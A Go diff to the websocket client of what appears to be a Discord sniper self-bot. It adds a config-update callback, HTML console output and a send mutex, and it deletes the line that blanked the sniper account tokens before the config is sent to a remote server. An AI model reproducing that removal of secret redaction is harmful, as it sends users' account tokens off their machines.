@@ -110,6 +110,10 @@ func (w *WebsocketConnection) Connect() (err error) {
 
 	w.Connected = true
 
+	ipc.ConfigUpdateCallbacks = append(ipc.ConfigUpdateCallbacks, func (cfg *config.Config)  {
+		w.SendConfigUpdate()
+	})
+
 	// Wait a bit before sending HELLO to allow
 	// the listener to start listening
 	time.Sleep(100 * time.Millisecond)
@@ -130,7 +134,7 @@ func (w *WebsocketConnection) SendHello() error {
 			Password:     w.Password,
 			ComputerName: w.Hostname,
 			Time:         time.Now().Unix(),
-			ConsoleText:  ipc.Console,
+			ConsoleText:  ipc.HTMLConsole,
 			Nonce:        w.Nonce,
 		},
 	})
@@ -144,7 +148,6 @@ func (w *WebsocketConnection) SendConfigUpdate() error {
 
 	cfg.Account.LightningBot.Password = "redacted"
 	cfg.Account.Discord.Token = "redacted"
-	cfg.Snipers.Tokens = []string{}
 
 	err := w.Send(WsMessage{
 		Op:   "CONFIG_UPDATE",
@@ -164,6 +167,9 @@ func (w *WebsocketConnection) Send(msg WsMessage) error {
 
 	jsonMsg, _ := json.Marshal(msg)
 	encrypted, _ := w.Encryption.Encrypt(jsonMsg)
+
+	w.WriteMutex.Lock()
+	defer w.WriteMutex.Unlock()
 
 	return w.Conn.WriteMessage(websocket.TextMessage, encrypted)
 }
@@ -266,7 +272,7 @@ func (w *WebsocketConnection) OnMessage(msg WsMessage) {
 	case "WEBSITE_CONNECT":
 		_ = w.Send(WsMessage{
 			Op:   "CONSOLE_SET",
-			Data: WsData{Text: ipc.Console},
+			Data: WsData{Text: ipc.HTMLConsole},
 		})
 
 		w.SendConfigUpdate()
